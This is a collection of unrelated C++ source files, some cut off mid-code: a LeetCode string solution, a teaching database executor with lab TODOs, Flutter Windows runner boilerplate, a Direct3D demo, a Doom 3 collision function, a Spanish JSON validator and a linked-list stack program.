    "// 2000. Reverse Prefix of Word\n/*\nGiven a 0-indexed string word and a character ch, reverse the segment of word that starts at index 0 and ends at the index of the first occurrence of ch (inclusive). If the character ch does not exist in word, do nothing.\n\nFor example, if word = \"abcdefd\" and ch = \"d\", then you should reverse the segment that starts at 0 and ends at 3 (inclusive). The resulting string will be \"dcbaefd\".\nReturn the resulting string.\n\n\n\nExample 1:\n\nInput: word = \"abcdefd\", ch = \"d\"\nOutput: \"dcbaefd\"\nExplanation: The first occurrence of \"d\" is at index 3.\nReverse the part of word from 0 to 3 (inclusive), the resulting string is \"dcbaefd\".\nExample 2:\n\nInput: word = \"xyxzxe\", ch = \"z\"\nOutput: \"zxyxxe\"\nExplanation: The first and only occurrence of \"z\" is at index 3.\nReverse the part of word from 0 to 3 (inclusive), the resulting string is \"zxyxxe\".\nExample 3:\n\nInput: word = \"abcd\", ch = \"z\"\nOutput: \"abcd\"\nExplanation: \"z\" does not exist in word.\nYou should not do any reverse operation, the resulting string is \"abcd\".\n\n\nConstraints:\n\n1 <= word.length <= 250\nword consists of lowercase English letters.\nch is a lowercase English letter.\n*/\n\n// Solution\n\nclass Solution\n{\npublic:\n    string reversePrefix(string word, char ch)\n    {\n        int n = word.size();\n        int index = 0;\n        for (int i = 0; i < n; i++)\n        {\n            if (word[i] == ch)\n            {\n                index = i;\n                break;\n            }\n        }\n        string ans = \"\";\n        for (int i = index; i >= 0; i--)\n        {\n            ans += word[i];\n        }\n        for (int i = index + 1; i < n; i++)\n        {\n            ans += word[i];\n        }\n\n        return ans;\n    }\n};",
    "#include \"execution_manager.h\"\n\n#include \"executor_delete.h\"\n#include \"executor_index_scan.h\"\n#include \"executor_insert.h\"\n#include \"executor_nestedloop_join.h\"\n#include \"executor_projection.h\"\n#include \"executor_seq_scan.h\"\n#include \"executor_update.h\"\n#include \"index/ix.h\"\n#include \"record_printer.h\"\n\nTabCol QlManager::check_column(const std::vector<ColMeta> &all_cols, TabCol target) {\n    if (target.tab_name.empty()) {\n        // Table name not specified, infer table name from column name\n        std::string tab_name;\n        for (auto &col : all_cols) {\n            if (col.name == target.col_name) {\n                if (!tab_name.empty()) {\n                    throw AmbiguousColumnError(target.col_name);\n                }\n                tab_name = col.tab_name;\n            }\n        }\n        if (tab_name.empty()) {\n            throw ColumnNotFoundError(target.col_name);\n        }\n        target.tab_name = tab_name;\n    } else {\n        // Make sure target column exists\n        if (!(sm_manager_->db_.is_table(target.tab_name) &&\n              sm_manager_->db_.get_table(target.tab_name).is_col(target.col_name))) {\n            throw ColumnNotFoundError(target.tab_name + '.' + target.col_name);\n        }\n    }\n    return target;\n}\n\nstd::vector<ColMeta> QlManager::get_all_cols(const std::vector<std::string> &tab_names) {\n    std::vector<ColMeta> all_cols;\n    for (auto &sel_tab_name : tab_names) {\n        // \u8fd9\u91ccdb_\u4e0d\u80fd\u5199\u6210get_db(), \u6ce8\u610f\u8981\u4f20\u6307\u9488\n        const auto &sel_tab_cols = sm_manager_->db_.get_table(sel_tab_name).cols;\n        all_cols.insert(all_cols.end(), sel_tab_cols.begin(), sel_tab_cols.end());\n    }\n    return all_cols;\n}\n\nstd::vector<Condition> QlManager::check_where_clause(const std::vector<std::string> &tab_names,\n                                                     const std::vector<Condition> &conds) {\n    auto all_cols = get_all_cols(tab_names);\n    // Get raw values in where clause\n    std::vector<Condition> res_conds = conds;\n    for (auto &cond : res_conds) {\n        // Infer table name from column name\n        cond.lhs_col = check_column(all_cols, cond.lhs_col);\n        if (!cond.is_rhs_val) {\n            cond.rhs_col = check_column(all_cols, cond.rhs_col);\n        }\n        TabMeta &lhs_tab = sm_manager_->db_.get_table(cond.lhs_col.tab_name);\n        auto lhs_col = lhs_tab.get_col(cond.lhs_col.col_name);\n        ColType lhs_type = lhs_col->type;\n        ColType rhs_type;\n        if (cond.is_rhs_val) {\n            cond.rhs_val.init_raw(lhs_col->len);\n            rhs_type = cond.rhs_val.type;\n        } else {\n            TabMeta &rhs_tab = sm_manager_->db_.get_table(cond.rhs_col.tab_name);\n            auto rhs_col = rhs_tab.get_col(cond.rhs_col.col_name);\n            rhs_type = rhs_col->type;\n        }\n        if (lhs_type != rhs_type) {\n            throw IncompatibleTypeError(coltype2str(lhs_type), coltype2str(rhs_type));\n        }\n    }\n    return res_conds;\n}\n\nint QlManager::get_indexNo(std::string tab_name, std::vector<Condition> curr_conds) {\n    int index_no = -1;\n    TabMeta &tab = sm_manager_->db_.get_table(tab_name);\n    for (auto &cond : curr_conds) {\n        if (cond.is_rhs_val && cond.op != OP_NE) {\n            // If rhs is value and op is not \"!=\", find if lhs has index\n            auto lhs_col = tab.get_col(cond.lhs_col.col_name);\n            if (lhs_col->index) {\n                // This column has index, use it\n                index_no = lhs_col - tab.cols.begin();\n                break;\n            }\n        }\n    }\n    return index_no;\n}\n\nvoid QlManager::insert_into(const std::string &tab_name, std::vector<Value> values, Context *context) {\n    // lab3 task3 Todo\n    // make InsertExecutor\n    // call InsertExecutor.Next()\n    // lab3 task3 Todo end\n}\n\nvoid QlManager::delete_from(const std::string &tab_name, std::vector<Condition> conds, Context *context) {\n    // Parse where clause\n    conds = check_where_clause({tab_name}, conds);\n    // Get all RID to delete\n    std::vector<Rid> rids;\n    // make scan executor\n    std::unique_ptr<AbstractExecutor> scanExecutor;\n    // lab3 task3 Todo\n    // \u6839\u636eget_indexNo\u5224\u65adconds\u4e0a\u6709\u65e0\u7d22\u5f15\n    // \u521b\u5efa\u5408\u9002\u7684scan executor(\u6709\u7d22\u5f15\u4f18\u5148\u7528\u7d22\u5f15)\n    // lab3 task3 Todo end\n\n    for (scanExecutor->beginTuple(); !scanExecutor->is_end(); scanExecutor->nextTuple()) {\n        rids.push_back(scanExecutor->rid());\n    }\n\n    // lab3 task3 Todo\n    // make deleteExecutor\n    // call deleteExecutor.Next()\n    // lab3 task3 Todo end\n}\n\nvoid QlManager::update_set(const std::string &tab_name, std::vector<SetClause> set_clauses,\n                           std::vector<Condition> conds, Context *context) {\n    TabMeta &tab = sm_manager_->db_.get_table(tab_name);\n    // Parse where clause\n    conds = check_where_clause({tab_name}, conds);\n    // Get raw values in set clause\n    for (auto &set_clause : set_clauses) {\n        auto lhs_col = tab.get_col(set_clause.lhs.col_name);\n        if (lhs_col->type != set_clause.rhs.type) {\n            throw IncompatibleTypeError(coltype2str(lhs_col->",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"mi_card\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"Vertexium.hpp\"\n\nconst VERTEX VERTICES[3] =\n{\n    { 0.0f,  0.5f, 0.0f, { 0.0f, 0.0f, 1.0f, 1.0f }},   \n    {-0.5f, -0.5f, 0.0f, { 0.0f, 0.0f, 1.0f, 1.0f }},   \n    { 0.5f, -0.5f, 0.0f, { 0.0f, 0.0f, 1.0f, 1.0f }},\n\n};\n\n                                                           //forward decs\n                                            HWND hWnd; WNDCLASSEX wc; class D3D;\n\nint WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow)\n{\n    ZeroMemory(&wc, sizeof(WNDCLASSEX));\n\n                                            wc.cbSize = sizeof(WNDCLASSEX);\n                                            wc.style = CS_HREDRAW | CS_VREDRAW;\n                                            wc.lpfnWndProc = WinProc;\n                                            wc.hInstance = hInstance;\n                                            wc.hCursor = LoadCursor(NULL, IDC_ARROW);\n                                            wc.lpszClassName = L\"WindowClass\";\n\n    RegisterClassEx(&wc);\n\n    RECT wr = { 0, 0, 800, 600 };\n    AdjustWindowRect(&wr, WS_OVERLAPPEDWINDOW, FALSE);\n\n    hWnd = CreateWindowEx\n    (\n                                            NULL,\n                                            L\"WindowClass\",\n                                            L\"I Love Vertices <3\",\n                                            WS_OVERLAPPEDWINDOW,\n                                            300,\n                                            300,\n                                            800,\n                                            800,\n                                            NULL,\n                                            NULL,\n                                            hInstance,\n                                            NULL\n    );\n\n    ShowWindow(hWnd, nCmdShow);\n\n    D3D* myD3D = new D3D;\n    myD3D->InitD3D(hWnd);myD3D->CompileShaders();myD3D->CreateBuffers(VERTICES);myD3D->DebugMemoryAddressesAndCompilation();\n\n    MSG message;\n    while(1)\n    {\n        if(PeekMessage(&message, NULL,0,0,PM_REMOVE))\n        {\n            TranslateMessage(&message);\n            DispatchMessage(&message);\n\n            if (message.message == WM_QUIT)\n                break;\n        }\n        else\n        {\n            myD3D->RenderFrame();\n        }\n    }\n\n    myD3D->ReleaseD3D(myD3D->swapChain, myD3D->device, myD3D->context, myD3D->p_BackBuffer, myD3D->p_VertexShader, myD3D->p_PixelShader);\n    return message.wParam;\n}",
    "/*\n===========================================================================\n\nDoom 3 GPL Source Code\nCopyright (C) 1999-2011 id Software LLC, a ZeniMax Media company. \n\nThis file is part of the Doom 3 GPL Source Code (?Doom 3 Source Code?).  \n\nDoom 3 Source Code is free software: you can redistribute it and/or modify\nit under the terms of the GNU General Public License as published by\nthe Free Software Foundation, either version 3 of the License, or\n(at your option) any later version.\n\nDoom 3 Source Code is distributed in the hope that it will be useful,\nbut WITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\nGNU General Public License for more details.\n\nYou should have received a copy of the GNU General Public License\nalong with Doom 3 Source Code.  If not, see <http://www.gnu.org/licenses/>.\n\nIn addition, the Doom 3 Source Code is also subject to certain additional terms. You should have received a copy of these additional terms immediately following the terms and conditions of the GNU General Public License which accompanied the Doom 3 Source Code.  If not, please request a copy in writing from id Software at the address below.\n\nIf you have questions concerning this license or the applicable additional terms, you may contact in writing id Software LLC, c/o ZeniMax Media Inc., Suite 120, Rockville, Maryland 20850 USA.\n\n===========================================================================\n*/\n\n/*\n===============================================================================\n\n\tTrace model vs. polygonal model collision detection.\n\n===============================================================================\n*/\n\n#include \"precompiled.h\"\n#pragma hdrstop\n\n#include \"CollisionModel_local.h\"\n\n/*\n===============================================================================\n\nRetrieving contacts\n\n===============================================================================\n*/\n\n/*\n==================\nidCollisionModelManagerLocal::Contacts\n==================\n*/\nint idCollisionModelManagerLocal::Contacts( contactInfo_t *contacts, const int maxContacts, const idVec3 &start, const idVec6 &dir, const float depth,\n\t\t\t\t\t\t\t\tconst idTraceModel *trm, const idMat3 &trmAxis, int contentMask,\n\t\t\t\t\t\t\t\tcmHandle_t model, const idVec3 &origin, const idMat3 &modelAxis ) {\n\ttrace_t results;\n\tidVec3 end;\n\n\t// same as Translation but instead of storing the first collision we store all collisions as contacts\n\tidCollisionModelManagerLocal::getContacts = true;\n\tidCollisionModelManagerLocal::contacts = contacts;\n\tidCollisionModelManagerLocal::maxContacts = maxContacts;\n\tidCollisionModelManagerLocal::numContacts = 0;\n\tend = start + dir.SubVec3(0) * depth;\n\tidCollisionModelManagerLocal::Translation( &results, start, end, trm, trmAxis, contentMask, model, origin, modelAxis );\n\tif ( dir.SubVec3(1).LengthSqr() != 0.0f ) {\n\t\t// FIXME: rotational contacts\n\t}\n\tidCollisionModelManagerLocal::getContacts = false;\n\tidCollisionModelManagerLocal::maxContacts = 0;\n\n\treturn idCollisionModelManagerLocal::numContacts;\n}\n",
    "//  ---                  JSON validator                      ---\n//  ---  Este programa recibe un archivo .json de entrada.   ---\n//  ---  Verifica que est\u00e9 bien escrito el formato JSON.     ---\n//  ---  En caso de un error, imprime en cosola.             ---\n//  ---  Si es correcto crea dos archivos de salida.         ---\n//  ------------------------------------------------------------\n\n#include <iostream>\n#include <fstream>\n#include <stack>\n#include <queue>\n#include <string>\n\nusing namespace std;\n\nconst string NOMBRE_ARCHIVO_ENTRADA = \"entrada.json\";\n\nenum ModoAnalisis\n{\n    JSON,\n    LLAVE,\n    VALOR,\n    LISTA\n};\n\nclass ExpresionJSON\n{\nprivate:\n    stack<char> pila;\n    string buffers;\n\npublic:\n    void evaluarCaracter(char c, char nc, ModoAnalisis &modo, string buffer);\n    void imprimir(ofstream &archivoSalida) const;\n};\n\nclass ExpresionValor\n{\nprivate:\n    stack<char> pila;\n    string buffers;\n\npublic:\n    void evaluarCaracter(char c, char nc, ModoAnalisis &modo, string buffer);\n    void imprimir(ofstream &archivoSalida) const;\n};\n\nclass ExpresionLlave\n{\nprivate:\n    stack<char> pila;\n    string buffers;\n\npublic:\n    void evaluarCaracter(char c, char nc, ModoAnalisis &modo, string buffer);\n    void imprimir(ofstream &archivoSalida) const;\n};\n\nclass ExpresionLista\n{\nprivate:\n    stack<char> pila;\n    string buffers;\n\npublic:\n    void evaluarCaracter(char c, char nc, ModoAnalisis &modo, string buffer);\n    void imprimir(ofstream &archivoSalida) const;\n};\n\nvoid procesarArchivo(const string &nombreArchivo, const string &nombreArchivoSalida, const string &nombreBuffers, ExpresionJSON &expresionJSON, ExpresionValor &expresionValor, ExpresionLlave &expresionLlave, ExpresionLista &expresionLista);\n\nint main()\n{\n    string archivoEntrada = NOMBRE_ARCHIVO_ENTRADA;\n    string archivoSalida = \"salida.json\";\n    string buffers = \"buffers.txt\";\n\n    ExpresionJSON expresionJSON;\n    ExpresionValor expresionValor;\n    ExpresionLlave expresionLlave;\n    ExpresionLista expresionLista;\n\n    procesarArchivo(archivoEntrada, archivoSalida, buffers, expresionJSON, expresionValor, expresionLlave, expresionLista);\n\n    return 0;\n}\n\nvoid procesarArchivo(const string &nombreArchivo, const string &nombreArchivoSalida, const string &nombreBuffers, ExpresionJSON &expresionJSON, ExpresionValor &expresionValor, ExpresionLlave &expresionLlave, ExpresionLista &expresionLista)\n{\n    ifstream archivo(nombreArchivo);\n    ofstream archivoSalida(nombreArchivoSalida);\n    ofstream buffers(nombreBuffers);\n\n    if (!archivo)\n    {\n        cout << \"No se pudo abrir el archivo de entrada: \" << nombreArchivo << endl;\n        return;\n    }\n\n    cout << \"Se pudo abrir el archivo de entrada: \" << nombreArchivo << endl\n         << endl;\n\n    char c;\n    char nc;\n    string buffer; // Buffer global para almacenar los caracteres\n    ModoAnalisis modo = JSON;\n\n    while (archivo.get(c))\n    {\n        if (!isspace(c)) // omitir espacios\n        {\n            buffer += c;\n            while (isspace(archivo.peek()))\n            {\n                archivo.get(nc);\n            }\n            nc = archivo.peek(); // obtener el siguiente caracter sin ser un espacio\n            switch (modo)\n            {\n            case JSON:\n                expresionJSON.evaluarCaracter(c, nc, modo, buffer);\n                break;\n            case VALOR:\n                expresionValor.evaluarCaracter(c, nc, modo, buffer);\n                break;\n            case LISTA:\n                expresionLista.evaluarCaracter(c, nc, modo, buffer);\n                break;\n            case LLAVE:\n                expresionLlave.evaluarCaracter(c, nc, modo, buffer);\n                break;\n            }\n        }\n    }\n\n    expresionJSON.imprimir(buffers);\n    expresionValor.imprimir(buffers);\n    expresionLista.imprimir(buffers);\n    expresionLlave.imprimir(buffers);\n\n    archivoSalida << buffer; // Imprimir el buffer en el archivo de salida\n    archivoSalida.close();\n    archivo.close();\n    cout << \"Archivo JSON verificado con exito!\" << endl;\n}\n\nvoid ExpresionJSON::evaluarCaracter(char c, char nc, ModoAnalisis &modo, string buffer)\n{\n    if (pila.empty())\n    {\n        if (c == '{')\n        {\n            pila.push(c);\n            buffers += c;\n            modo = LLAVE;\n        }\n        else\n        {\n            cout << \"Error JSON: Car\u00e1cter inesperado antes de la apertura de llaves. El caracter erroneo fue: \" << c << endl;\n            cout << buffer << endl;\n            exit(1);\n        }\n    }\n    else\n    {\n        if (c == ',')\n        {\n            buffers += c;\n            if (nc == '\"')\n            {\n                modo = LLAVE;\n            }\n        }\n        else if (c == '{') // varias anidaciones\n        {\n            pila.push(c);\n            buffers += c;\n            modo = LLAVE;\n        }\n        else if (c == '}')\n        {\n            pila.pop();\n            buffers += c;\n        }\n        else\n        {\n            cout << \"Error JSON: Car\u00e1cter inesperado, se espera un",
    "#include <iostream>\nusing namespace std;\nstruct node\n{\n\tint Data;\n\tnode* next;\n};\n\n// global pointer\nnode* TOP = NULL;\nnode* current = NULL;\n\nbool isEmpty()\n{\n\tif (TOP == NULL)\n\t\treturn true;\n\telse\n\t\treturn false;\n}\nvoid push(int newdata)\n{\n\tnode* current = new node();\n\tcurrent->Data = newdata;\n\tif (!isEmpty())\n\t{\n\t\tcurrent->next = TOP;\n\t\tTOP = current;\n\t}\n\telse\n\t{\n\t\tTOP = current;\n\t\tTOP->next = NULL;\n\t}\n}\nvoid pop()\n{\n\tif (!isEmpty())\n\t{\n\t\tcurrent = TOP;\n\t\tTOP = TOP->next;\n\t\tdelete current;\n\t}\n\telse\n\t\tcout << \"No stack found\" << endl;\n}\nvoid popAll()\n{\n\twhile (!isEmpty())\n\t{\n\t\tcurrent = TOP;\n\t\tTOP = TOP->next;\n\t\tdelete current;\n\t}\n}\nvoid display()\n{\n\tif (!isEmpty())\n\t{\n\t\tcurrent = TOP;\n\t\twhile (current != NULL)\n\t\t{\n\t\t\tcout << current->Data << endl;\n\t\t\tcurrent = current->next;\n\t\t}\n\t}\n\telse cout << \"There is no data in the Stack\\n\";\n}\nvoid app()\n{\n\t/*\n\t\top -> operation\n\t\tc -> confirm\n\t\tp -> push node\n\t\tao -> another operation\n\t\ts -> starter app\n\t*/\n\t\tint op, c, p, ao, s;\n\tcout << \"--- Welcome to stack implementation---\\n\";\n\tdo\n\t{\n\t\tcout << \"Choise what do you want\\n\";\n\t\tcout << \"Push -> (1)\\n\";\n\t\tcout << \"Pop an Elements -> (2) \\n\";\n\t\tcout << \"POP All Elements -> (3)\\n\";\n\t\tcout << \"Display -> (4)\\n\";\n\t\tcout << \"Exit -> (5)\\n\";\n\t\tcin >> op;\n\t\tswitch (op)\n\t\t{\n\t\tcase 1:\n\t\t\tcout << \"Enter value do you want to push \\n\";\n\t\t\tcin >> p;\n\t\t\tpush(p);\n\t\t\tbreak;\n\t\tcase 2:\n\t\t\tcout << \"Are you sure to pop one node\\n\";\n\t\t\tcout << \"To Confirm Enter -> (1)\\n\";\n\t\t\tcout << \"To Cancel Enter -> any key\\n\";\n\t\t\tcin >> c;\n\t\t\tif (c == 1)\n\t\t\t{\n\t\t\t\tpop();\n\t\t\t\tcout << \"\\nCheck data of stack after poping first node : \\n \";\n\t\t\t\tdisplay();\n\t\t\t}\n\t\t\telse {\n\t\t\t\tcout << \"Pop is canceled\\n\";\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 3:\n\t\t\tcout << \"Are you sure to pop all nodes\\n\";\n\t\t\tcout << \"To Confirm Enter -> (1)\\n\";\n\t\t\tcout << \"To Cancel Enter -> any key\\n\";\n\t\t\tcin >> c;\n\t\t\tif (c == 1)\n\t\t\t{\n\t\t\t\tpopAll ();\n\t\t\t\tcout << \"\\nCheck data of stack after poping all nodes : \\n \";\n\t\t\t\tdisplay();\n\t\t\t}\n\t\t\telse {\n\t\t\t\tcout << \"Pop all is canceled\\n\";\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 4:\n\t\t\tcout << \"Pushed Elements are:\\n\";\n\t\t\tdisplay();\n\t\t\tbreak;\n\t\tcase 5:\n\t\t\treturn;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tcout << \"Wrong Input Try Again\\n\";\n\t\t}\n\t\tcout << \"Do you want another opration\\n\";\n\t\tcout << \"Yes -> 1 \\n\";\n\t\tcout << \"NO -> any key \\n\";\n\t\tcin >> ao;\n\t} while (ao == 1);\n}\nint main()\n{\n\tapp();\n\treturn 0;\n}",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = 